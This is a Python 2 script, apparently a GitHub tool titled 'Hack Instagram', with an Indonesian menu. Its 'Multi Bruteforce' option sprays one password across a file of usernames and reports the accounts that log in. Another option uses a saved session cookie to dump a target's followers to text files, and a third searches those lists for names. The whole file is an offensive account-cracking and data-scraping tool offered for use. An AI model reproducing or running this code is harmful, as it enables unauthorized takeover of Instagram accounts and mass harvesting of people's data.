import json,glob,sys,os,struct

if struct.calcsize("P") * 8 == 64: #Checking device architecture (32 or 64bit)
   import ig64b as ig
else:
   import ig32b as ig


mn = """Hack Instagram By: JustA Hacker
Github : https://github.com/JustAHacker/hack_ig
Menu :
1. Multi Bruteforce
2. Dump target followers
3. Name finder from list
4. Log out

0. Exit
"""

lmn = """Hack Instagram By: JustA Hacker
Github : https://github.com/JustAHacker/hack_ig
Telegram : @JustAHacker
You need to log in to instagram to use this tool!

Please log in to your instagram account!
"""

def dumpy(id,next = False):
    if next == False:
       p = ig.fetch_followers(id,ku = cookie)
       if len(p) == 2:
          data,next = p

       else:
          data = p[0]
          next = None
          open(id+".txt","w").write("True")

    elif next == None:
       open(id+".txt","w").write("True")
       return True

    else:
       try:
          p = ig.fetch_followers(id,after = next, ku = cookie)
          if len(p) == 2:
             data,next = p
             open(id+".txt","w").write(next)
          else:
             data = p[0]
             next = None
             open(id+".txt","w").write("True")
       except:
          open(id+".txt","w").write(next)
          print ("Limit! Kamu harus menunggu sekitar 2 jam / log out dan mengganti akun lain untuk melanjutkan!\n")
          return False

    open(un+".txt","a+").write("\n".join(data)+"\n")
    if next:
       dumpy(id,next)
       open(id+".txt","w").write(next)


def check_login():
    global cookie
    try:
       cookie = json.loads(open("mycookie.txt").read())
       return True
    except:
       return False

def menu(c):
    if c == 2:
       global un
       un = raw_input("Username : ")
       id = ig.getuserid(un,cookie)
       globy = glob.glob(id+".txt")
       if globy == []:
          print ("Memulai dump followers..")
          dumpy(id)
       else:
          next = open(id+".txt").read()
          if next != "True":
             print ("Melanjutkan dump followers..")
             dumpy(id,next)
          else:
             print ("Kamu telah selesai mengambil followers @"+un)

    elif c == 1:
       target = raw_input("Target file : ")
       pwed = raw_input("Password : ")
       trx = open(target).read().splitlines()
       print("\n\n")
       for i in trx:
           flx = open(target).read().splitlines()
           flx.remove("") if "" in flx else None
           flx.remove(i) if i in flx else None
           sys.stdout.write("\rCracking account : "+str(len(flx)))
           sys.stdout.flush()
           open(target,"w").write("\n".join(flx))
           log = ig.login(i,pwed)
           if log == "checkpoint":
              sys.stdout.write("\rUsername : "+i+"                        \nPassword : "+pwed+"\n [!] Status : Checkpoint\n\n")
              sys.stdout.flush()
           elif "Failed" in log:
              flx.append(i)
              open(target,"w").write("\n".join(flx))
           elif log == False:
              pass
           else:
              try:
                 log = json.loads(log)
                 sys.stdout.write("\rUsername : "+i+"                        \nPassword : "+pwed+"\n [+] Status : Success!\n\n\n")
              except:
                 pass
       print ("\n\nCracking selesai.")

    elif c == 3:
       flo = open(raw_input("File : ")).read().splitlines()
       nm = raw_input("Name (example : asep) : ")
       liszt = []
       for i in flo:
           if nm in i:
              liszt.append(i)

       print (str(len(liszt)) + " "+ nm + " Name found!")
       if len(liszt) >= 1:
          open(nm+".txt","w").write("\n".join(liszt))




    elif c == 4:
       os.remove("mycookie.txt")
       exit()


    elif c == 0:
       exit()


if __name__ == "__main__":
   if check_login():
      os.system("clear")
      print (mn)
      menu(int(raw_input("Pilih : ")))
   else:
      os.system("clear")
      print (lmn)
      loggid = raw_input("Username : ")
      pawwid = raw_input("Password : ")
      bxc = ig.login(loggid,pawwid)
      try:
         bbb = json.loads(bxc)
         open("mycookie.txt","w").write(bxc)
         print ("Login success!")
      except Exception as e:
         print e
         print ("Login failed!")
         print bxc
